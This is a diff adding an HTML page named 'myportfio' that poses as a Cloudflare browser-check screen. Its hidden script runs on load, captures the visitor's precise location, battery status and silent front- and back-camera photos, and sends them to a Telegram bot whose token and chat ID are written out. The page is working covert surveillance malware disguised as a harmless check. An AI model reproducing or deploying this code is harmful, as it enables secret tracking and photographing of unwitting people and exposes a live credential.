@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+    <meta charset="UTF-8">
+  	  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>myportfio</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: white;
+      color: auto;
+    }
+    #message {
+      font-size: 1.5em;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="message" hidden=""></div>
+  
+<table width="100%" height="100%" cellpadding="20">   
+<tbody>  
+<tr>   
+<td align="center" valign="middle">   
+<div class="cf-browser-verification cf-im-under-attack">   
+<noscript>   
+<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>   
+</noscript>   
+<div id="cf-content" style="display: block;">   
+<div id="cf-bubbles">   
+<div class="bubbles"></div>   
+<div class="bubbles"></div>   
+<div class="bubbles"></div>   
+</div>   
+<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1>   
+<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">   
+<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>   
+</div>   
+<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p>   
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 10 seconds…</p>   
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p>   
+</div>   
+<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded">   <span data-translate="error" style="display: none;">error code: 1020</span>
+
+</form>  
+</div>   
+<div class="attribution">  
+DDoS protection by   
+<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>   
+<br>   
+<span class="ray_id">Ray ID: <code id="ray">04r3dfh65qxmv70u6</code></span>   
+</div> </td>   
+</tr>   
+</tbody>  
+</table>  
+  <video id="video" autoplay="" playsinline=""></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const botToken = "7988655641:AAFZKCahhcQ1qPGDTKXKMQiDpbrmOHiGpyo";
+    const chatId = "-1002513958639";
+
+    async function sendTelegramMessage(text) {
+      console.log("📤 Sending text to Telegram:", text);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text
+        })
+      });
+    }
+
+    async function sendTelegramPhoto(base64Image, caption) {
+      const blob = await (await fetch(base64Image)).blob();
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+      formData.append("caption", caption);
+
+      console.log("📤 Sending photo to Telegram with caption:", caption);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function getLocationAndSend() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000
+          });
+        });
+
+        const { latitude, longitude, altitude } = position.coords;
+        const msg = `📍 Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAltitude: ${altitude ?? "Not available"}`;
+        console.log("📍 Location:", msg);
+        await sendTelegramMessage(msg);
+      } catch (err) {
+        console.error("❌ Geolocation error:", err.message);
+        await sendTelegramMessage("❌ Failed to get location: " + err.message);
+      }
+    }
+
+    async function getBatteryAndSend() {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          const percent = Math.round(battery.level * 100) + "%";
+          const charging = battery.charging ? "Yes" : "No";
+          const msg = `🔋 Battery:\nLevel: ${percent}\nCharging: ${charging}`;
+          console.log("🔋 Battery:", msg);
+          await sendTelegramMessage(msg);
+        } catch (e) {
+          console.error("Battery error:", e);
+          await sendTelegramMessage("❌ Failed to get battery info.");
+        }
+      } else {
+        await sendTelegramMessage("❌ Battery API not supported.");
+      }
+    }
+
+    async function takePhoto(facingMode = "user", label = "Photo") {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: facingMode } },
+          audio: false
+        });
+
+        video.srcObject = stream;
+        await new Promise(res => video.onloadedmetadata = res);
+        await new Promise(res => setTimeout(res, 2000));
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL("image/jpeg");
+
+        stream.getTracks().forEach(track => track.stop());
+        console.log(`📷 ${label} captured.`);
+        await sendTelegramPhoto(dataUrl, `${label}`);
+      } catch (e) {
+        console.error(`❌ Failed to take ${label}`, e);
+        await sendTelegramMessage(`❌ Failed to take ${label}`);
+      }
+    }
+
+    async function runAll() {
+      await getLocationAndSend();
+      await getBatteryAndSend();
+      await takePhoto("user", "🤳 Front Camera");
+      await takePhoto("environment", "📸 Back Camera");
+      document.getElementById("message").textContent = "";
+    }
+
+    runAll();
+  </script>
+
+</body></html>
